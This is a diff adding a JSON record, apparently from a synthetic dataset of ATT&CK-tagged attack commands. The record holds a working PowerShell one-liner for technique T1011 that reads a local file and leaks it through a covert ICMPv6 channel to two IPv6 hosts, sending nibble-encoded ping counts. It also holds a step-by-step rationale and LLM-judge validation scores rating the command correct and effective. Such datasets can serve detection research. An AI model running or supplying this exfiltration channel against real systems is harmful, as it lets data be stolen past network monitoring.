@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Encodes nibbles into the number of ICMPv6 echos (-Count) sent to two destinations, a covert channel over ICMPv6 under T1011.",
+  "rationale_steps": [
+    "Derive high/low nibbles from each byte.",
+    "Transmit small bursts where the burst length encodes the nibble.",
+    "Space bursts with a short sleep to delineate values for the receiver."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-a32fe73c",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, valid operators, proper separators, and legitimate Test-Connection parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It reads a file and encodes each byte\u2019s nibbles into ICMPv6 echo counts to two IPv6 targets, matching T1011 traffic signaling, though Test-Connection\u2019s per-ping delays and potential -Quiet behavior may impact the intended timing and throughput.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T16:50:33.876092Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, and valid parameters for all cmdlets.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by encoding data nibbles into ICMPv6 echo counts sent to two distinct destinations, a classic covert channel implementation aligned with T1011 Traffic Signaling.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:50:48.788919Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
